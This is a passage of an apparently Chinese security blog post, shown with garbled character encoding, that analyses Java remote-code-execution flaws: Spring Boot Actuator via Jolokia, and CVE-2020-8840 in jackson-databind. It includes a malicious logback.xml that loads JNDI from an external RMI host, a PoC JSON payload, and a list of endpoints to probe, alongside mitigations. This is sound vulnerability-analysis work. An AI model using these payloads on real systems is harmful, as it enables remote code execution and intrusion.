åˆ†æ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: å¼€å§‹è·å–cmdå‚æ•°å€¼</span><br><span class="line">e&#x3D;&gt;end: è¾“å‡ºè¿”å›å€¼</span><br><span class="line">op1&#x3D;&gt;operation: æ‰§è¡Œå‘½ä»¤ï¼ˆè¿‡ç¨‹ç±»ä¼¼Runtime.getRuntime().exec(command)ï¼‰</span><br><span class="line">st-&gt;op1-&gt;e</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; æµç¨‹å›¾æ˜¾ç¤ºçš„ä»£ç æ‰§è¡Œçš„è¿‡ç¨‹ï¼Œä¸éš¾å‘ç°æˆ‘ä»¬æ²¡æœ‰çœ‹åˆ°è¿‡æ»¤å‚æ•°ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦è¾“å…¥æ­£ç¡®çš„ä¸€ç³»åˆ—æ“ä½œï¼Œä»è€Œå¯¼è‡´çš„<code>å‘½ä»¤æ‰§è¡Œæ¼æ´</code>ã€‚</p><p><strong>è¯´æ˜ï¼š</strong></p><ol><li>processæŒ‡å‘ä¸€ä¸ªæœ¬åœ°è¿›ç¨‹ï¼Œç›¸å¯¹äºmainè¿›ç¨‹æ¥è¯´ï¼ŒprocessæŒ‡å‘çš„ç§°ä¸ºå­è¿›ç¨‹ã€‚<a href="https://blog.csdn.net/dataiyangu/article/details/83988654" target="_blank" rel="noopener">^1</a></li><li>BufferedInputStream æ˜¯ç¼“å†²è¾“å…¥æµï¼Œå®ƒç»§æ‰¿FilterInputStreamç±»ã€‚BufferedInputStream çš„ä½œç”¨æ˜¯ä¸ºå¦ä¸€ä¸ªè¾“å…¥æµæ·»åŠ ä¸€äº›åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼Œæä¾›â€œç¼“å†²åŠŸèƒ½â€ä»¥åŠæ”¯æŒâ€œmark()æ ‡è®°â€å’Œâ€œreset()é‡ç½®æ–¹æ³•â€ã€‚BufferedInputStream æœ¬è´¨ä¸Šæ˜¯é€šè¿‡ä¸€ä¸ªå†…éƒ¨ç¼“å†²åŒºæ•°ç»„å®ç°çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨æ–°å»ºæŸè¾“å…¥æµå¯¹åº”çš„BufferedInputStreamåï¼Œå½“æˆ‘ä»¬é€šè¿‡read()è¯»å–è¾“å…¥æµçš„æ•°æ®æ—¶ï¼ŒBufferedInputStreamä¼šå°†è¯¥è¾“å…¥æµçš„æ•°æ®åˆ†æ‰¹çš„å¡«å…¥åˆ°ç¼“å†²åŒºä¸­ã€‚æ¯å½“ç¼“å†²åŒºä¸­çš„æ•°æ®è¢«è¯»å®Œä¹‹åï¼Œè¾“å…¥æµä¼šå†æ¬¡å¡«å……æ•°æ®ç¼“å†²åŒºï¼›å¦‚æ­¤åå¤ï¼Œç›´åˆ°æˆ‘ä»¬è¯»å®Œè¾“å…¥æµæ•°æ®ä½ç½®ã€‚[^2]</li></ol><hr><h2 id="çŸ¥è¯†å†…å®¹è¡¥å……"><a href="#çŸ¥è¯†å†…å®¹è¡¥å……" class="headerlink" title="çŸ¥è¯†å†…å®¹è¡¥å……"></a>çŸ¥è¯†å†…å®¹è¡¥å……</h2><p> <strong>ç»§ç»­é˜…è¯»ä¸‹é¢çš„å†…å®¹ï¼Œä½ éœ€è¦è¡¥å……æ›´å¤šçŸ¥è¯†ã€‚</strong></p><ol><li>Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</li><li>RMIã€JRMPã€JMXã€JNDI</li><li>JNDIæ³¨å…¥åŸç†</li></ol><p>ç¬”è€…åœ¨æ­¤ï¼Œåšä¸€ä¸ªç®€å•ä»‹ç»ã€‚</p><ul><li>Javaåºåˆ—åŒ–å¯¹è±¡å› å…¶å¯ä»¥æ–¹ä¾¿çš„å°†å¯¹è±¡è½¬æ¢æˆå­—èŠ‚æ•°ç»„ï¼Œåˆå¯ä»¥æ–¹ä¾¿å¿«é€Ÿçš„å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–æˆJavaå¯¹è±¡è€Œè¢«éå¸¸é¢‘ç¹çš„è¢«ç”¨äºSocketä¼ è¾“ã€‚ åœ¨RMI(Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨-Java Remote Method Invocation)å’ŒJMX(Javaç®¡ç†æ‰©å±•-Java Management Extensions)æœåŠ¡ä¸­å¯¹è±¡ååºåˆ—åŒ–æœºåˆ¶è¢«å¼ºåˆ¶æ€§ä½¿ç”¨ã€‚åœ¨Httpè¯·æ±‚ä¸­ä¹Ÿæ—¶å¸¸ä¼šè¢«ç”¨åˆ°ååºåˆ—åŒ–æœºåˆ¶ï¼Œå¦‚ï¼šç›´æ¥æ¥æ”¶åºåˆ—åŒ–è¯·æ±‚çš„åç«¯æœåŠ¡ã€ä½¿ç”¨Baseç¼–ç åºåˆ—åŒ–å­—èŠ‚å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç­‰ã€‚</li><li>Java RMIç”¨äºä¸åŒè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ï¼Œè¿™äº›è™šæ‹Ÿæœºå¯ä»¥åœ¨ä¸åŒçš„ä¸»æœºä¸Šã€ä¹Ÿå¯ä»¥åœ¨åŒä¸€ä¸ªä¸»æœºä¸Šï¼›ä¸€ä¸ªè™šæ‹Ÿæœºä¸­çš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªè™šæ‹Ÿä¸Šä¸­çš„å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¸è¿‡æ˜¯å…è®¸è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡è¦é€šè¿‡ä¸€äº›æ ‡å¿—åŠ ä»¥æ ‡è¯†ã€‚</li><li>JRMPï¼ˆ Java Remote Method Protocolï¼‰åè®®é€šä¿¡ï¼Œç”¨äºè§„èŒƒè¿œç¨‹æ–¹æ³•è°ƒç”¨çš„åè®®</li><li>Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</li><li>å…³äºJNDIæ³¨å…¥ç™¾åº¦æœ‰å¾ˆå¤šæ–‡ç« ï¼Œæ¨è<a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">æ·±å…¥ç†è§£JNDIæ³¨å…¥ä¸Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a>ã€<a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDIæ³¨å…¥åŸç†åŠåˆ©ç”¨</a></li></ul><p><strong>æ¨èæ–‡ç« ï¼š</strong></p><ul><li><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">Java åºåˆ—åŒ–/ååºåˆ—åŒ–</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">åŸºäºJavaååºåˆ—åŒ–RCE - ææ‡‚RMIã€JRMPã€JNDI</a></li><li><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">ææ‡‚RMIã€JRMPã€JNDI-ç»ˆç»“ç¯‡</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">MicroFocusç ”ç©¶è®ºæ–‡(çº¯è‹±æ–‡)</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li></ul><hr><h2 id="Spring-Boot-Actuators-to-RCE"><a href="#Spring-Boot-Actuators-to-RCE" class="headerlink" title="Spring Boot Actuators to RCE"></a>Spring Boot Actuators to RCE</h2><p>&emsp;&emsp; Actuator æ˜¯ springboot æä¾›çš„ç”¨æ¥å¯¹åº”ç”¨ç³»ç»Ÿè¿›è¡Œè‡ªçœå’Œç›‘æ§çš„åŠŸèƒ½æ¨¡å—ï¼Œå€ŸåŠ©äº Actuator å¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹åº”ç”¨ç³»ç»ŸæŸäº›ç›‘æ§æŒ‡æ ‡è¿›è¡ŒæŸ¥çœ‹ã€ç»Ÿè®¡ç­‰ã€‚åœ¨ Actuator å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšå¥½ç›¸å…³æƒé™æ§åˆ¶ï¼Œéæ³•ç”¨æˆ·å¯é€šè¿‡è®¿é—®é»˜è®¤çš„æ‰§è¡Œå™¨ç«¯ç‚¹ï¼ˆendpointsï¼‰æ¥è·å–åº”ç”¨ç³»ç»Ÿä¸­çš„ç›‘æ§ä¿¡æ¯ã€‚</p><p>&emsp;&emsp; ä½¿ç”¨è€å¤–æä¾›çš„æºç ï¼Œç”¨mvnç¼–è¯‘è¿è¡Œã€‚<a href="https://github.com/veracode-research/actuator-testbed" target="_blank" rel="noopener">GitHubé¡¹ç›®åœ°å€</a>ç›´æ¥è®¿é—®<code>http://127.0.0.1:8090/jolokia/list</code><br>æˆ–è€…ä¿®æ”¹ipå’Œç«¯å£<code>actuator-testbed\src\main\resources\application.properties</code></p><p><img src="https://img-blog.csdnimg.cn/20200225152718508.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200225152401453.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200228131827582.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; ä¸Šé¢çš„<code>reloadByURL</code>å¯ä»¥åŠ è½½ä¸€ä¸ªå¤–éƒ¨URLè¿›è€Œé‡æ–°åŠ è½½æ—¥å¿—é…ç½®ï¼Œç»“æœé€ æˆäº†RCEã€‚æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªæ¶æ„logback.xmlçš„URLã€‚<br><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//ä¸‹é¢æ˜¯logback.xmlå†…å®¹</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>rmiå’ŒldapæœåŠ¡éƒ½èƒ½è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œç¬”è€…åœ¨è¿™é‡Œé€‰æ‹©rmiæœåŠ¡ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200227143151844.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>ç®€å•çš„è§¦å‘æµç¨‹æµç¨‹å›¾ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: Spring-boot-actuator</span><br><span class="line">e&#x3D;&gt;end: RCE</span><br><span class="line">op&#x3D;&gt;operation: Jolokia</span><br><span class="line">op2&#x3D;&gt;operation: RMI</span><br><span class="line">cond&#x3D;&gt;condition: logback.xml?</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;op2-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op2</span><br></pre></td></tr></table></figure><hr><p><strong>æºç åˆ†æ</strong></p><ol><li>ç¬¬ä¸€æ­¥ä¼šå…ˆæ³¨å†Œjolokia<br><img src="https://img-blog.csdnimg.cn/20200229132647972.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</a><br>çœ‹ä¸Šé¢URLåˆ†æ<code>reloadByURL</code>å¾ˆé‡è¦ï¼Œçœ‹ä¸€ä¸‹æºç <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reloadByURL</span><span class="params">(URL url)</span> <span class="keyword">throws</span> JoranException </span>&#123;</span><br><span class="line">       StatusListenerAsList statusListenerAsList = <span class="keyword">new</span> StatusListenerAsList();</span><br><span class="line"></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line">       addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">       loggerContext.reset();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// after a reset the statusListenerAsList gets removed as a listener</span></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (url != <span class="keyword">null</span>) &#123;</span><br><span class="line">               JoranConfigurator configurator = <span class="keyword">new</span> JoranConfigurator();</span><br><span class="line">               configurator.setContext(loggerContext);</span><br><span class="line">               configurator.doConfigure(url);</span><br><span class="line">               addInfo(<span class="string">"Context: "</span> + loggerContext.getName() + <span class="string">" reloaded."</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           removeStatusListener(statusListenerAsList);</span><br><span class="line">           <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">               StatusPrinter.print(statusListenerAsList.getStatusList());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>ä¸éš¾å‘ç°ä¸‹é¢ä¸‰è¡Œä»£ç æ˜¯å…³é”®ï¼Œé‡ç½®æ—¥å¿—é…ç½®ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addStatusListener(statusListenerAsList);</span><br><span class="line">      addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">      loggerContext.reset();</span><br></pre></td></tr></table></figure></li></ol><p><strong>æ¨èæ–‡ç« </strong></p><p><a href="https://xz.aliyun.com/t/4258" target="_blank" rel="noopener">spring boot actuator rce via jolokia</a><br><a href="https://www.anquanke.com/post/id/173265" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 2</a><a href="https://xz.aliyun.com/t/4259" target="_blank" rel="noopener">å…³äºæ­¤æ¼æ´æ›´å¤šçš„éªšæ“ä½œå‚è€ƒ</a></p><hr><p><strong>ä»£ç å®¡è®¡å…³é”®è¯</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">trace</span><br><span class="line">health</span><br><span class="line">loggers</span><br><span class="line">metrics</span><br><span class="line">autoconfig</span><br><span class="line">heapdump</span><br><span class="line">threaddump</span><br><span class="line">env</span><br><span class="line">info</span><br><span class="line">dump</span><br><span class="line">configprops</span><br><span class="line">mappings</span><br><span class="line">auditevents</span><br><span class="line">beans</span><br><span class="line">jolokia</span><br><span class="line">cloudfoundryapplication</span><br><span class="line">hystrix.stream</span><br><span class="line">actuator</span><br><span class="line">actuator&#x2F;auditevents</span><br><span class="line">actuator&#x2F;beans</span><br><span class="line">actuator&#x2F;health</span><br><span class="line">actuator&#x2F;conditions</span><br><span class="line">actuator&#x2F;configprops</span><br><span class="line">actuator&#x2F;env</span><br><span class="line">actuator&#x2F;info</span><br><span class="line">actuator&#x2F;loggers</span><br><span class="line">actuator&#x2F;heapdump</span><br><span class="line">actuator&#x2F;threaddump</span><br><span class="line">actuator&#x2F;metrics</span><br><span class="line">actuator&#x2F;scheduledtasks</span><br><span class="line">actuator&#x2F;httptrace</span><br><span class="line">actuator&#x2F;mappings</span><br><span class="line">actuator&#x2F;jolokia</span><br><span class="line">actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure><hr><p><strong>é˜²æŠ¤æªæ–½</strong><br>&emsp;&emsp; åœ¨ä½¿ç”¨Actuatoræ—¶ï¼Œä¸æ­£ç¡®çš„ä½¿ç”¨æˆ–è€…ä¸€äº›ä¸ç»æ„çš„ç–å¿½ï¼Œå°±ä¼šé€ æˆä¸¥é‡çš„ä¿¡æ¯æ³„éœ²ç­‰å®‰å…¨éšæ‚£ã€‚åœ¨ä»£ç å®¡è®¡æ—¶å¦‚æœæ˜¯springbooté¡¹ç›®å¹¶ä¸”é‡åˆ°actuatorä¾èµ–ï¼Œåˆ™æœ‰å¿…è¦å¯¹å®‰å…¨ä¾èµ–åŠé…ç½®è¿›è¡Œå¤æŸ¥ã€‚ä¹Ÿå¯ä½œä¸ºä¸€æ¡è§„åˆ™æ·»åŠ åˆ°é»‘ç›’æ‰«æå™¨ä¸­è¿›ä¸€æ­¥æŠŠæ§ã€‚<br>&emsp;&emsp; å®‰å…¨çš„åšæ³•æ˜¯ä¸€å®šè¦å¼•å…¥securityä¾èµ–ï¼Œæ‰“å¼€å®‰å…¨é™åˆ¶å¹¶è¿›è¡Œèº«ä»½éªŒè¯ã€‚åŒæ—¶è®¾ç½®å•ç‹¬çš„Actuatorç®¡ç†ç«¯å£å¹¶é…ç½®ä¸å¯¹å¤–ç½‘å¼€æ”¾ã€‚<br>æ›´å¤šé˜²æŠ¤æªæ–½å‚è€ƒ<a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBootåº”ç”¨ç›‘æ§Actuatorä½¿ç”¨çš„å®‰å…¨éšæ‚£</a></p><hr><h2 id="CVE-2020-8840-FasterXML-jackson-databind-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2020-8840-FasterXML-jackson-databind-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2020-8840 FasterXML/jackson-databind è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2020-8840 FasterXML/jackson-databind è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p><strong>&emsp;&emsp; FasterXML/jackson-databindæ˜¯ä¸€ä¸ªç”¨äºJSONå’Œå¯¹è±¡è½¬æ¢çš„Javaç¬¬ä¸‰æ–¹åº“ï¼Œå¯å°†Javaå¯¹è±¡è½¬æ¢æˆjsonå¯¹è±¡å’Œxmlæ–‡æ¡£ï¼ŒåŒæ ·ä¹Ÿå¯å°†jsonå¯¹è±¡è½¬æ¢æˆJavaå¯¹è±¡ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¼æ´POC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227143135510.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><p>æˆ‘ä»¬æŸ¥çœ‹å®˜æ–¹çš„æ¼æ´æºç æäº¤ä¿®å¤è®°å½•<a href="https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497" target="_blank" rel="noopener">GitHubåœ°å€</a>åˆ†æã€‚<br><img src="https://img-blog.csdnimg.cn/20200302161840124.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>æŸ¥çœ‹POC ï¼Œæ‰¾åˆ°JndiConverterç±»<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\",&#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190911380.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>æŸ¥çœ‹ç±»çš„ç»§æ‰¿å…³ç³»ï¼Œæ‰¾åˆ°AbstractConverterç±»</li></ul><p><img src="https://img-blog.csdnimg.cn/20200302191128920.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>æ‰¾åˆ°toObjectæ–¹æ³•ï¼Œè¯æ®ä¸è¶³ï¼Œç»§ç»­æº¯æºã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">toObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.toObjectImpl(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>è¯æ®å……åˆ†ï¼Œæ­¤æ˜¯å†…å¥¸ã€‚é‡ç½®textå†…å®¹å¯¼è‡´RCEã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.toObject(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">        <span class="keyword">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302192146603.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><hr><p><strong>æ€è·¯æ•´ç†</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: å¼€å§‹</span><br><span class="line">e1&#x3D;&gt;end: ç»“æŸ</span><br><span class="line">e2&#x3D;&gt;end: RCE</span><br><span class="line">op1&#x3D;&gt;operation: POCå­—ç¬¦ä¸²</span><br><span class="line">op2&#x3D;&gt;operation: JndiConverter-&gt;toObjectImplæ–¹æ³•</span><br><span class="line">op3&#x3D;&gt;operation: AbstractConverter-&gt;setAsTextæ–¹æ³•</span><br><span class="line">op4&#x3D;&gt;operation: è¯·æ±‚ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit</span><br><span class="line">op5&#x3D;&gt;operation: Send LDAP reference result for Exploit redirecting to http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">op6&#x3D;&gt;operation: http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">cond&#x3D;&gt;condition: RCEï¼Ÿ</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;cond-&gt;op4-&gt;op5-&gt;op6-&gt;e2</span><br><span class="line">cond(yes)-&gt;op4</span><br><span class="line">cond(no)-&gt;e1</span><br></pre></td></tr></table></figure><hr><p><strong>ä¿®å¤æ–¹å¼</strong><br>4. å‡çº§ jackson-databind è‡³2.9.10.3ã€2.8.11.5ã€2.10.x<br>5. æ’æŸ¥é¡¹ç›®ä¸­æ˜¯å¦ä½¿ç”¨ xbean-reflectã€‚è¯¥æ¬¡æ¼æ´çš„æ ¸å¿ƒåŸå› æ˜¯xbean-reflect ä¸­å­˜åœ¨ç‰¹æ®Šçš„åˆ©ç”¨é“¾å…è®¸ç”¨æˆ·è§¦å‘ JNDI è¿œç¨‹ç±»åŠ è½½æ“ä½œã€‚å°†xbean-reflectç§»é™¤å¯ä»¥ç¼“è§£æ¼æ´æ‰€å¸¦æ¥çš„å½±å“ã€‚</p><hr><h1 id="æ¨èå‡ ä¸ªå†å²ç‰ˆæœ¬RCE"><a href="#æ¨èå‡ ä¸ªå†å²ç‰ˆæœ¬RCE" class="headerlink" title="æ¨èå‡ ä¸ªå†å²ç‰ˆæœ¬RCE"></a>æ¨èå‡ ä¸ªå†å²ç‰ˆæœ¬RCE</h1><ol><li>com.threedr3am.bug.fastjson.FastjsonSerialize(TemplatesImpl) åˆ©ç”¨æ¡ä»¶ï¼šfastjson &lt;= 1.2.24 + Feature.SupportNonPublicField</li><li>com.threedr3am.bug.fastjson.NoNeedAutoTypePoc åˆ©ç”¨æ¡ä»¶ï¼šfastjson &lt; 1.2.48 ä¸éœ€è¦ä»»ä½•é…ç½®ï¼Œé»˜è®¤é…ç½®é€šæ€RCE</li><li>com.threedr3am.bug.fastjson.HikariConfigPoc(HikariConfig) åˆ©ç”¨æ¡ä»¶ï¼šfastjson &lt;= 1.2.59 